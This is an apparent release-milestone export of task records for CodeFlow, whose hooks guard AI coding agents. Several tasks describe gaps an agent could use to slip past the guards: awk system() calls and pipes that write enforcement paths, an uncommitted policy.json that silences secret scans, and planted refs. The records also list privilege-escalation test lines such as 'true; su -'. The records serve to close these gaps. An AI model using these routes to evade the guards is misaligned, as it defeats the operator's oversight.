Release/The 4.0.0 milestone fixes/Issue 394 and awk write amendment (2026-10-29)/The exec guard refuses an awk program that writes an enforcement path

The exec guard refuses an awk program that writes an enforcement path

TSK-1067todo

After this merges, an agent cannot write an enforcement path through a literal output target.

The whole outcome and context, from the record

Outcome

After this merges, an agent cannot write an enforcement path through a literal output target, `system()` command or command pipe in `awk` program text visible on the command line, on a route where exec-guard judges the line; awk program text the shell fills in is refused wherever a checkout is reachable, as it is for the other interpreters; and the guards' stated residual boundary is unchanged.

Context

Source: the TSK-397 builder (PR 331), 2026-10-29, outside that task's outcome. An awk program can write a file or run a command itself, so the shell sees no redirection: print > "path", print >> "path", print | "cmd", system("cmd") and "cmd" | getline. exec-guard judges inline code only for the interpreter families python, node, nodejs, perl and ruby (crates/codeflow-core/src/security/outward.rs:1391-1406), and treats awk only as a reader of files for secret reads (crates/codeflow-core/src/security/interpreter.rs:31). The builder reported that git-guard refuses such a program when the path is an enforcement path; that paired result is not reproduced yet, and AC-1 establishes it.

Scope: the bounded class of inline program sources that can hide an enforcement-path write from the guards, with awk as the demonstrated case. The task reads what program text visible on the command line spells literally (output targets, system() commands, command pipes). It does not read program files, and it does not model every effect of arbitrary interpreter code, and it keeps the residual boundary the guard documents (crates/codeflow-core/src/security/arguments.rs:66-72, operator decision 2026-10-15): code in a file the guard does not read, and a path the program builds at run time, stay past the guard, with the OS sandbox as the backstop. Changing that boundary is an operator decision. Program text the shell fills in at run time is a separate case: exec-guard already refuses it for the other interpreters wherever a checkout is reachable (security/arguments.rs:700-720), and awk takes the same rule; it is never weakened to a residual.

Overlap, checked at line tip 35672e8bd:

  • TSK-1002 (PR 346; its record is not on the line yet) owns interpreter arguments, inline-code path handling for the five families and secret reads. It does not read awk's output grammar.
  • TSK-1052 owns a run of a file written earlier on the same line (TSK-1052.md:62), such as awk 'BEGIN{system("run")}' after a modelled write of run. A direct system() call or command pipe that runs a writer on an enforcement path needs no earlier write, so it is this task's.
  • TSK-1053 owns runner directories.
  • TSK-378 owns the launchers outside the family list (TSK-378.md:22) and Perl embedded in parallel replacement strings (:104). This task adds no launcher and no parallel form. Both tasks change interpreter_family in outward.rs, so whichever lands second builds on the other's family list.
  • TSK-342 owns writing programs' output options and the nested sed script reading, which covers sed's own w command.
  • TSK-413 owns inline Python git-call expressions.

None covers an awk program that writes or runs a writer, so this is its own task.

Outcome

Release/The 4.0.0 milestone fixes/Status line fields and coverage shard drift amendment (2026-10-29)/The status line shows effort, pull request, usage and worktree when Claude Code supplies them

The status line shows effort, pull request, usage and worktree when Claude Code supplies them

TSK-1070todo

After this merges, a contributor on a CodeFlow project sees their session's effort, the open pull request and its review state.

The whole outcome and context, from the record

Outcome

After this merges, a contributor on a CodeFlow project sees their session's effort, the open pull request and its review state, their 5-hour and 7-day usage, and the linked worktree in the shipped status line whenever Claude Code reports them, and a project on an earlier shipped line moves to this one on `codeflow update`.

Context

Source: issue 402 ("Richer default status line: effort, PR state and usage in managed settings"), which asks the scaffold to adopt a richer statusLine, or to state that projects own it. The operator decided on 2026-10-29 (13:2x) to adopt it as recommended. Issue 351 and TSK-1028 (complete) are the history: TSK-1028 made the shipped line the jq line of issue 351's comment (model name and id, version, output style, folder, branch, context use) with a folder-and-branch fallback when jq is absent, and left effort to each person. That leaves a contributor no view of the effort their session runs at, of the pull request their branch has, of how much of their plan's usage windows is spent, or of whether they are in a linked worktree.

This task adds four fields to the shipped line. Each is printed only when Claude Code's status JSON supplies it, and the line prints nothing for a field that is absent: no placeholder, no null and no stray separator. The field names were checked against https://code.claude.com/docs/en/statusline.md on 2026-10-29 and match the issue exactly:

ShownField in the status JSONDocumented as absent when
effort beside the modeleffort.level (low, medium, high, xhigh, max)the current model does not support the effort parameter
the open pull request and its review statepr.number, pr.review_state (approved, pending, changes_requested, draft)no open PR is found for the branch, or it merged or closed; review_state may be absent while pr is present
plan usagerate_limits.five_hour.used_percentage, rate_limits.seven_day.used_percentage (0 to 100)the user is not a claude.ai Pro or Max subscriber, before the first API response, or a window has passed its resets_at; each window can be absent alone
linked worktreeworkspace.git_worktree (the worktree name)the directory is the main working tree

Constraints from the issue and from TSK-1028 that hold here:

  • A plugin or mod cannot provide statusLine, so the managed .claude/settings.json presets remain the only shared route.
  • A committed statusLine replaces a contributor's own. The opt-out is the contributor's .claude/settings.local.json. TSK-1028 wrote this into docs/harness-posture.md ("Shared and personal settings") and cf-customize/references/personal-settings.md; this task keeps both true and lists the new fields there.
  • codeflow update replaces a statusLine that is exactly a value CodeFlow shipped, proved by the recorded baseline, and keeps and reports a line the project changed (TSK-1028 AC-4). The new line is a new shipped value, so a project still holding TSK-1028's line, or the older branch-only line, moves to it by the same rule. No new update mechanism is needed.
  • Without jq the line prints the folder and branch and "jq not found" and exits 0 (TSK-1028 AC-2). The new fields need jq and are not part of the fallback.

Non-goals: no call to gh or the network for the pull request (only what Claude Code puts on stdin), no refreshInterval or other statusLine key, no change to the effort opt-in (TSK-1028 AC-3), no change to a project's own line, and no change to the Codex configuration. The builder picks the exact layout and may reuse the context bands (green below 50, yellow below 80, red from 80) for the usage percentages; if so, the PR says so. TSK-1028 allowed a managed script in place of the inline command; that choice stays the builder's, with the same update rule.

Dependency: TSK-1028 is complete and its code is on this line, so there is no edge. TSK-1028's criteria stay as they are.

Release/The 4.0.0 milestone fixes/Status line fields and coverage shard drift amendment (2026-10-29)/Coverage shard drift is reported in CI before a shard overruns

Coverage shard drift is reported in CI before a shard overruns

TSK-1071todo

After this merges, a maintainer is told in CI, before a coverage shard runs long enough to time out.

The whole outcome and context, from the record

Outcome

After this merges, a maintainer is told in CI, before a coverage shard runs long enough to time out, when the shard data no longer covers the suite, or the record states why that cannot be done and which check catches the drift instead.

Context

Source: the Limits section of TSK-1063 (PR 399, branch task/TSK-1063-every-windows-test-partition-finishes-well-insid), after its Codex review. TSK-1063 gives the Windows partitions a drift check that runs in the windows test build job, where the test list exists before any partition starts. The Linux coverage shards (gates-coverage, two shards, TSK-270) share the same planner but not that protection. TSK-1063 records:

  • the shards keep the rest-shard rule: each shard job builds and runs in one job, before any test list exists, so a test the measurements do not know runs in the rest shard;
  • scripts/coverage-shards.py drift --list <nextest list json> exists but is run by hand and is not in CI, because no coverage job holds a test list before its shard runs;
  • the report job's check already fails a shard whose test minutes pass 18 (24 job minutes with 6 of build and setup), but it runs after the shards, so it reports an overrun and cannot prevent it;
  • the shards sat inside the 24 minute bound in the six line runs TSK-1063 read (highest 17.6 job minutes), with data that had drifted (about 90 summed minutes measured against 40 planned) and an uneven split in single runs (53.0 against 28.6 summed minutes in run 40839551888).

TSK-1063 asked the coordinator to file this follow-up because none of the open CI tasks owns this repository's own coverage shards: TSK-384 covers the shipped managed workflow, and TSK-343 excludes hosted shard changes.

Scope: this repository's own Linux coverage shards, in .github/workflows/codeflow-ci.yml, scripts/coverage-shards.py and its data scripts/coverage-test-times.json. Not the managed workflow assets/base/ci/codeflow-ci.yml (TSK-384) and not the Windows partitions (TSK-1063).

Leads for the investigation, none confirmed. They are options for the builder to measure, not a chosen design:

  • the windows test build job (or a Linux equivalent) already lists the suite; a drift job on Linux that reads a list before the shards start, with the cost of building the list on Linux counted against the 12 minute verdict goal of TSK-270;
  • tests that exist only on one platform (cfg(unix), cfg(windows)) make a Windows list a partial answer for the Linux shards, which the check would have to account for;
  • the drift check run after the shards, in the report job, from the shards' own lists, which is cheaper but is not "before a shard overruns"; it counts only as a stated fallback if the builder shows the earlier check cannot be built;
  • a scheduled run of the check, to be weighed against the same limit.

The task ends in one of two states, decided by the investigation (AC-1): shard drift is detected in CI before a shard can overrun, or the task records why it cannot be and what the shipped checks do instead. Raising a shard timeout alone is not a fix.

Outcome
The 4.0.0 milestone fixes EPC-022

Release/The 4.0.0 milestone fixes/Issue 404 amendment (2026-10-29)/The privilege text check matches a chained launcher only as a whole word

The privilege text check matches a chained launcher only as a whole word

TSK-1072todo

After this merges, an agent can run a heredoc or inline program whose text holds `.

The whole outcome and context, from the record

Outcome

After this merges, an agent can run a heredoc or inline program whose text holds `; subprocess` or another word that only starts with a launcher name without a privilege refusal, while every real chained launch stays refused.

Context

Source: issue #404, session row 6 ("a heredoc Python body containing ...; subprocess.run"), refused under security.privilege_escalation as "Semicolon chained su (pattern ; su)".

The privilege check's semicolon rule is a substring match with no end boundary: cmd.contains(&format!("; {priv_cmd}")) (crates/codeflow-core/src/security/privilege.rs:136). So ; su matches ; subprocess, ; sum, ; sudoers.d and any other word that starts with a launcher name. The && and || rules on line 128 need a space after the launcher, and the pipe rules (:81-91) need whitespace. The check runs on the raw line, heredoc bodies and quoted text included, unless TSK-233's certified-prose grammar relieves the line (crates/codeflow-core/src/hooks/exec_guard.rs:121).

Rechecked on 2026-10-29 with the line's binary at bd721f39b (codeflow hook exec-guard --contract 3, payload directory a worktree of this repository). Each line is refused with the ; su pattern:

LineVerdict
python3 -I - <<'EOF' with body import subprocess; subprocess.run(['true'])refused
python3 -I -c "print('a; subprocess')"refused
gh pr comment 1 --body "the guard refused text with ; su in prose"refused (a real launcher word as data: TSK-1073's class, not this task's)
true; su -refused (a real launch; must stay refused)
python3 -I -c "import subprocess as s newline s.run(['sudo', 'id'])"refused by the separate action-family check: security/outward.rs:26-31 reads each word of interpreter code as a command, and :57-104 turns a privilege family match into the "privilege action" refusal; so that check, not this substring, refuses interpreter code that names a launcher

Outcome: the semicolon rule matches a launcher only where the shell would read it as that launcher's name: a word that merely starts with su, sudo, doas, pkexec or runuser is not a launcher.

Scope: the raw-text matchers of the privilege check, and any sibling raw matcher the investigation finds with the same in-word match. The floor stays a raw-text floor. Non-goals: reading quoted data as data (TSK-1073), launcher words inside interpreter code (refused on purpose by the code-word family check, which this task does not change), and the certified-prose grammar.

Placement: EPC-022 (4.0.0), under the standing direction that a defect which forces an adopter workaround goes in the current release; it needs no parser.

Outcome
The 4.0.0 milestone fixes EPC-022

Release/The 4.0.0 milestone fixes/Issue 404 amendment (2026-10-29)/The guards read command lines through a qualified shell parser

The guards read command lines through a qualified shell parser

TSK-1073todo

After this merges, an agent can pass quoted prose, patterns and message text to an identified program without a guard refusal.

The whole outcome and context, from the record

Outcome

After this merges, an agent can pass quoted prose, patterns and message text to an identified program without a guard refusal, and every line the guards refuse without the parser, where its text can run, is still refused.

Context

Source: issue #404 (CodeFlow 3.1.1). git-guard and exec-guard read a Bash call as text and with their own word readers, so quoted data can be read as code or as a path. The issue asks for a real shell parser whose tree the existing rules judge.

What the line already does, rechecked on 2026-10-29 with the line's binary at bd721f39b through codeflow hook git-guard and exec-guard (the issue gives descriptions, not exact lines, so each row was rebuilt from its description):

  • A literal assignment earlier on the same line resolves (TSK-406): the issue's git -C "$W" show, git -C "$R" ..., sed -i under $D and tar -xf $D/... -C $D/... all pass when the line assigns the variable, in ;, &&, newline, export and pipe shapes. A variable the line does not assign, or one filled by a substitution (D=$(mktemp -d)), stays refused, as the issue's own proposal keeps.
  • Quoted patterns and prose given to grep, rg, echo, printf and cat pass. A peer's headless form as data passes too: in a cat or tee heredoc and in gh pr comment --body "codex exec ...".
  • Still refused by exec-guard: a chained launcher (; su) in quoted data given to any program outside the certified-prose grammar (gh pr comment 1 --body "the text ; su in prose", a tee heredoc holding ; su), and the cases TSK-415, TSK-417, TSK-1024 and TSK-1072 own. A peer's headless form in interpreter code (a Python heredoc) is refused on purpose (below).

Outcome: an agent can pass quoted data to a program whose identity and argument grammar the guard establishes, without a false refusal, while every line the guards refuse without the parser, where its text can run, stays refused.

The base verdict below is the verdict both guards give on the revision at which this task starts, after TSK-1072 has landed, with the parser out of the path; a parse error or a disagreement uses that column.

Rules this task follows:

  • Fail closed. The parser reading may only relieve the classes AC-5 lists. A parse error, an unsupported construct, a dialect difference between the shells the harnesses run, or any disagreement between the parser and TSK-397's lexer (security/shell_lex.rs, from PR 331) on command or word boundaries leaves the line with the base verdict, and so does a line the lexer marks opaque (a construct it does not model in full) or current_shell (a ${ cmd; } substitution).
  • Build on TSK-397's lexer, never replace it here. It is the directory lexer of TSK-397's checks, which treat an opaque line's directory as unknown; it stays that, and becomes the divergence check. Retiring either reader is a later decision that needs this task's qualification evidence.
  • Execution identity (EPC-022, Guard scope follow-ups amendment): no allowance rests on a command name alone. Data relief needs the program to resolve to an executable the requester cannot substitute, through the resolution TSK-1053 builds.
  • Directories: the operator decided on 2026-10-25 that narrowing after cd cannot be made sound, so the parser does not narrow a directory. The issue's request to track cd, pushd and popd is not taken unless the operator revisits that decision.
  • Classes with their own owners, which this task does not re-enter: a file run after a same-line write (TSK-1052) and an unmodelled runner's child directory (TSK-1053), the two classes option D takes out of the text guard's promise (TSK-1002, PR 346); content already in committed history, outside the promise by the operator's direction of 2026-10-29 on TSK-1002 AC-15 (PR 346); a Git program variable before a program that runs Git (TSK-1053 AC-17, expected to close in PR 346); and a program-valued Git setting on a visible git call (TSK-1065).

Deliberate text scans that stay (the issue's trade-offs):

  • content written to an executable file, a .sh path, a startup file or an enforcement path, and a file run later on the line or in a later call (TSK-1052's class);
  • interpreter code: a heredoc or -c text given to a shell or an interpreter is code, so a launcher word or a peer's headless form in it stays refused (the issue's session rows 5 and 8). Relieving a string literal there needs a language reader, as TSK-413 does for git calls; that is not planned here;
  • shell -c strings, eval, trap, ssh remote commands, and the templates of xargs, find -exec and parallel are code.

Placement: EPC-022, 4.0.0 by the operator's decision of 2026-10-29. The planning pull request for issue #404 first recommended 4.1.0 (EPC-023), because the task needs a new parser dependency, execution identity and a qualification corpus run under real shells; the operator chose the current release. Its qualification (AC-3) is part of this task and ships with it.

Outcome
The 4.0.0 milestone fixes EPC-022

Release/The 4.0.0 milestone fixes/Content policy amendment (2026-10-29)/The default branch is the only local policy authority

The default branch is the only local policy authority

TSK-1077complete

After this merges, an operator can rely on every local hook and `codeflow ci` judging with the default branch's policy at one named SHA.

The whole outcome and context, from the record

Outcome

After this merges, an operator can rely on every local hook and `codeflow ci` judging with the default branch's policy at one named SHA, with no line able to add an exception and no fallback that guesses the authority.

Context

Source: CodeFlow's response to issue #279, the content policy design, revision 5 (Claude Fable 5.1, finalized 2026-10-29 22:30Z), unit U2, with all eleven of its decisions taken by the operator on 2026-10-29. Code was read at 53749287c and the citations hold at the line tip 2e6f654a4.

The local hooks take their policy from more than one place, and some of those places are guesses:

  • A line declared by a landed task record supplies path exceptions: over_target for the first declared target and stricter for the rest (crates/codeflow-core/src/hooks/landed_policy.rs:113-127), found by declared_target (:305-394) with a root_branch short-circuit at :312; documented at docs/policy-reference.md:107-114. Anyone who lands a record on a line controls the exception source for that line's task branches (design D-7, medium).
  • With remote HEAD unset, a sole origin/main or origin/master is accepted as the authority (landed_policy.rs:162-179), so a repository whose default is develop with a stale or planted origin/main is judged by it (D-8).
  • An empty refs/remotes/<remote>/* namespace falls back to HEAD or the working copy (landed_policy.rs:67-81); the condition also follows deleting the tracking refs or removing the remote (D-9, medium).
  • Pre-push falls back to the range base's policy when no authority resolves (crates/codeflow-cli/src/cmd/push_set.rs:280-291) (D-10).
  • codeflow ci judges with the working copy when the authority holds no policy.json (crates/codeflow-cli/src/cmd/ci.rs:1986) (D-14).

After this task the default branch, resolved to one SHA, is the only local policy authority, no line supplies a policy, exception, denial or level, and nothing is guessed. git.root_branch keeps its root-checkout role and loses its policy-source role.

Public behaviour change for 4.0.0 (decision 5): a project that keeps real exceptions only on a line loses them; the 4.0.0 release notes say so under that label. None exist in this repository.

Non-goals: the baseline copy of the landed policy and its refresh rules (TSK-1057, which depends on this task); the hosted jobs (TSK-336).

Outcome

Release/The 4.0.0 milestone fixes/Content policy amendment (2026-10-29)/Pre-commit scans run at the landed policy level

Pre-commit scans run at the landed policy level

TSK-1078todo

After this merges, an operator can rely on pre-commit and pre-merge-commit scanning for secrets and conflict markers at least at the level.

The whole outcome and context, from the record

Outcome

After this merges, an operator can rely on pre-commit and pre-merge-commit scanning for secrets and conflict markers at least at the level the default branch's policy sets, whatever the uncommitted policy file says.

Context

Source: the content policy design for issue #279, revision 5, unit U3, closing finding D-1 (Grok's design, item 4.4), which no task owned.

The pre-commit secret scan and conflict-marker check take their level from the uncommitted working-copy policy:

  • crates/codeflow-cli/src/cmd/git_hook.rs:116 loads Policy::load_effective(&root), which reads <root>/.codeflow/policy.json (crates/codeflow-core/src/hooks/policy.rs:872-874, :944-945);
  • core crates/codeflow-core/src/hooks/git_hook.rs:159 and :163 skip the scan and the marker check when is_active is false, and is_active is Block | Warn (policy.rs:62-64), so allow skips as off does;
  • the path gate already composes with the landed policy (:145; landed_policy.rs:629-638), and bootstrap grace keeps the scan on (policy.rs:991-1022); the commit-msg stage validates the file but a valid off passes.

An uncommitted off or allow therefore lets a content secret be committed with pre-commit silent. Who can write the file: in a Claude session Edit(/.codeflow/policy.json) is in permissions.deny, but Claude's file tools run no edit-guard (docs/policy-reference.md:1153); Codex and Grok run codeflow hook edit-guard (.codex/hooks.json:14, .grok/hooks/codeflow.json:14); outside a session nothing does. This task makes the edit harmless rather than blocking it: the landed level is the floor and the worktree may only raise it.

Non-goals: the path gate (already landed-composed); the hosted scan (TSK-336).

Outcome
The 4.0.0 milestone fixes EPC-022

Remote protect writes three owned rulesets and never weakens a rule

TSK-1080complete

After this merges, an operator can run `codeflow remote protect` to get three owned rulesets that bind the default branch and the.

The whole outcome and context, from the record

Outcome

After this merges, an operator can run `codeflow remote protect` to get three owned rulesets that bind the default branch and the integration lines to checks only trusted code produces, without weakening any existing rule, and `doctor` stays red while a recovery window is open.

Context

Source: the content policy design for issue #279, revision 5, unit U5, section 2.3, and decisions 1, 3 and 6 (operator, 2026-10-29). Closes findings D-11 and D-13.

Today codeflow remote protect leaves the two-pull-request self-authorization open and writes into rulesets it does not own:

  • crates/codeflow-core/src/remote.rs:746-781 writes pull_request at zero approvals, strict checks, non_fast_forward and deletion, with no update rule and no bypass actors;
  • :803-843 and :874-898 update every ruleset that targets the branch in place, sending only {"rules": ...} (:842), so a foreign ruleset keeps its bypass list and gains rules;
  • the target is the literal refs/heads/<pattern> (:790), although the matcher knows ~DEFAULT_BRANCH (:1009), so a renamed default branch loses its rules (D-13).

Live state, read with the operator's gh on 2026-10-29 at 18:43Z (state that can change; the builder re-reads it): main has ruleset 24379074 (~DEFAULT_BRANCH, strict, six names pinned to the Actions app id 15368, no bypass) and classic protection with enforce_admins: false; integration/ has ruleset 25435656 (non-strict: codeflow gates, windows, commit standards, release impact; non_fast_forward; deletion; no bypass).

The task makes remote protect write three rulesets it owns by name and, once created, by id, for a declared profile, check identity and line pattern:

  • A, "codeflow authority updates", on ~DEFAULT_BRANCH: update with update_allows_fetch_and_merge: false; bypass exactly one RepositoryRole (administrator under solo-administrator, the merging role under independent-review), bypass_mode: always.
  • B, "codeflow authority checks", on ~DEFAULT_BRANCH: pull_request (solo: zero approvals; independent: one, stale reviews dismissed, last push approval); required_status_checks strict with every name pinned by integration_id (the App's id for the authority: names when --check-app <id> is given, Mode A; else the Actions app id for the trusted: names, Mode B); non_fast_forward; deletion; empty bypass.
  • C, "codeflow line checks", on the line pattern (--lines, default integration/): pull_request at zero approvals; the trusted: names and codeflow gates and windows, each pinned to 15368; strict; non_fast_forward; deletion; empty bypass list, with no bypass for the merging identity; no creation rule (line creation stays unrestricted by the operator's decision of 2026-10-27 21:40). C is for the line's integrity: after its first push, a line receives content only through a pull request judged by the default branch's workflow, never rewritten or deleted. The commit a line is created at arrives by push, unjudged (Findings); a pull request from the line into the default branch judges it under B. It is not for secrecy: a task-branch push publishes content before any check runs, which TSK-1078's local scans and TSK-336's hosted scan address. The session design for away mode depends on C being strict with no bypass: the host then refuses a merge onto a line tip the checks did not run against, whoever merges.

doctor --check remote-perimeter fails while B's or C's bypass list is non-empty, so a recovery window cannot stay open unnoticed.

Owed by the operator, not agent work (decision 3, Mode A). Steps 1 to 5 may be done any time and change nothing until TSK-336 runs on main; step 6 runs after TSK-336 is on main, in one session; step 7 has no ordering dependency:

  1. Settings, Developer settings, GitHub Apps, New GitHub App: a name such as codeflow-authority-codeflow, no webhook, repository permission Checks read and write only, "Only on this account".
  2. Install the App on sathyassn/codeflow only; note the App id.
  3. Generate one private key on the App and download it.
  4. Repository Settings, Environments, New environment codeflow-authority; deployment branches and tags: selected branches and tags, main only.
  5. In that environment, add the secret CODEFLOW_AUTHORITY_APP_KEY (the key file's contents) and the variable CODEFLOW_AUTHORITY_APP_ID.
  6. After TSK-336 is on main: run codeflow remote protect --check-app <id> --lines "integration/" as the administrator; retire rulesets 24379074 and 25435656; run codeflow doctor --check remote-perimeter and stop only when it is green with no recovery window open. From TSK-336's merge until this step ends, every pull request into main and the lines is unmergeable (fail closed, by design).
  7. Decision 1's agent principal: create a non-administrator principal with Contents and Pull requests write and Actions read (no Workflows, Commit statuses, Checks, Administration, Environments or secrets access), install it, point every seat's gh and git at it and remove the operator's login from the seats' stores.

This task's hosted fixtures run against a scratch repository, never this one; this repository's rulesets are written only by the operator's step 6.

Non-goals: a git.authority_profile policy key, stored state, a --reduce command (a reduction is the administrator's edit on the host), retiring foreign rulesets by code.

Release/The 4.0.0 milestone fixes/After TSK-1002 amendment (2026-10-30)/A landed task whose record was added on the line binds at its reviewed head

A landed task whose record was added on the line binds at its reviewed head

TSK-1083todo

After this merges, a maintainer can complete a task that landed through a clean landing merge on a trusted line against its reviewed head.

The whole outcome and context, from the record

Outcome

After this merges, a maintainer can complete a task that landed through a clean landing merge on a trusted line against its reviewed head, even when its record was added on the line after that head and the line has since moved.

Context

Source: issue #413, triaged 2026-10-30. No open task covers it: TSK-1066 is the sync-merge case and TSK-1042 only reports.

A task can land on a line through a clean landing merge M of its reviewed head H while its record exists only on the line: a planning amendment P added the record after the task branch was cut, so H has no record. Once the line moves past M (L1, L2), neither binding is accepted:

  • Bound at H, binding_source finds the landing merge through task_landing and then calls reviewed_span_problem at H, which refuses with "is missing at completion" (crates/codeflow-core/src/workgraph/acceptance.rs:1295-1350, :1392).
  • Bound at M, the direct path judges every non-record change after M (later_change_judged, :2054) and refuses for L1's changes.

The task stays todo for good, so codeflow lists it as ready and every edge that depends on it looks unmet.

Design (fix A, the narrower of the two the issue offers): when the record is absent at H and present at M, the landing path may take the record from M, and only when all of these hold:

  • task_landing already found M, M is on the first-parent line of a trusted receiving line (untrusted_landing, :1714), and M is the clean re-merge of its parents (is_clean_remerge, :1814);
  • the record at M equals the record at M's first parent, so the task side added or changed nothing in it and its scope is the one the line planned;
  • the completed record differs from the record at M only in status and Closeout (SPC-013 R-60), as the existing reviewed_part comparison states;
  • no path other than the record differs between H and M's second parent. task_landing returns that second parent as the span head, and it may be a descendant of H (acceptance.rs:1677-1702; the AdoptionFixture at :5528 builds that shape with a status-only tail); today the span check that would judge it sits after the missing-record return at :1392, so the new path must run that check itself, also when the record is absent at both H and the second parent.

A record absent at M keeps today's "is missing at completion" refusal. The completed record is compared with the blob at M (on a worktree completion, task.content), never with the blob at the second parent. The reviewed commit stays H, and the review span stays H's. Nothing else in the binding changes: a record present at H follows today's path, and the direct path at M still judges later changes.

This binds trust, so the design gets a Fable review and the build a cross-lineage review with the cf-security-reviewer checklist.

Non-goals: fix B of the issue (treating a binding at M as a landed head); the sync-merge check (TSK-1066).

Outcome

Release/The 4.0.0 milestone fixes/After TSK-1002 amendment (2026-10-30)/The guard test fixtures ignore the host's Git configuration

The guard test fixtures ignore the host's Git configuration

TSK-1084complete

After this merges, a maintainer gets the same `hooks_cli` verdicts on macOS, Linux and Windows whatever Git configuration the host has.

The whole outcome and context, from the record

Outcome

After this merges, a maintainer gets the same `hooks_cli` verdicts on macOS, Linux and Windows whatever Git configuration the host has.

Context

Source: the hosted failure of PR 346 (TSK-1002) at 92e7b5029, triaged 2026-10-30 and corrected in the planning review the same day.

Hosted run 41026268442 failed one test, target_repository::tsk1002_review17_fd_values_help_programs_carets_and_backups, on Linux (coverage shard 2 of 2) and Windows (tests partition 5 of 12), while it passed on the builder's macOS host. The test expects git log ^main HEAD to be refused because a leading ^ handed to a Git call that runs a configured program must be quoted. The refusal needs a program to judge: the runner reader judges core.pager for a paging verb (crates/codeflow-core/src/hooks/git_guard/runners/catalog.rs:106, runners.rs:634-641) and runs its pattern check only when a runner or configured command exists (runners.rs:2248-2257). credential.helper is judged only for remote verbs (catalog.rs:115), so it cannot decide a git log verdict. The fixture configured no pager, so on the hosted runners the line was allowed. TSK-1002 then pinned core.pager in that fixture (c201cc0b3, crates/codeflow-cli/tests/hooks_cli/target_repository.rs:1700-1706), which supplies the program the test needs.

The guard runs through isolated_codeflow, which sets GIT_CONFIG_GLOBAL and GIT_CONFIG_SYSTEM to /dev/null (crates/codeflow-cli/tests/hooks_cli.rs:57-68), and the guard's configuration reader shells to git with that environment (crates/codeflow-core/src/security/git_config.rs:142-149). Why the macOS host still saw a pager before the pin is not known: a remaining leak (a configuration file Git reads outside those two variables, a test that builds its own command, or the fixtures' own git setup calls) or a difference in the fixture itself. A guard verdict that depends on the host makes the suite pass on one runner and fail on another, and can hide a real change in a verdict.

Non-goals: changing any guard verdict; the guard's own reading of a user's real configuration, which is product behaviour.

Outcome
